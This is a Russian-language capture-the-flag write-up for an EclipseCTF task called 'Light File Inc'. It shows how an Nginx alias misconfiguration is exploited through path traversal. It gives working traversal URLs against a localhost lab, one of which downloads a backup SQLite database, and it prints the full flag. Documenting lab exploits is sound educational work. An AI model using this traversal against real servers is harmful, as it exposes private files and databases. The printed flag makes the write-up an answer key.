# Light File Inc

***Описание***: Я уже опытен и крайне уверен, что не допускаю типичных багов и ошибок при разработке! Так ведь?

Ссылка: `http://localhost:8081`

Формат: EclipseCTF{...}

---
### Решение

Суть таска заключается в эксплуатации уязвимости Nginx Alias Path Traversal. Проблемное место в конфиге Nginx:

![ScreenShot](screenshots/LightFileInc-1.png)

Находим первую часть флага, перейдя по следующему пути (обращаем внимание на исходники!): 

```
http://localhost:8081/backups../backup/flag.txt
```

![ScreenShot](screenshots/LightFileInc-2.png)

>EclipseCTF{m3nt4l_cl4r1ty_15_4

Находим вторую часть флага, перейдя по следующему пути (обращаем внимание на исходники!):

```
http://localhost:8081/backups../backup/database/database.sqlite3
```

Перейдя по ссылке выше, мы скачаем файл `database.sqlite3` с сервера. Открываем его в DBBrowser (или подобном ПО):

![ScreenShot](screenshots/LightFileInc-3.png)

>\_luxury_I_c4nt_4ff0rd}

Сопоставляем две части флага и готово!

---

***Флаг***: `EclipseCTF{m3nt4l_cl4r1ty_15_4_luxury_I_c4nt_4ff0rd}`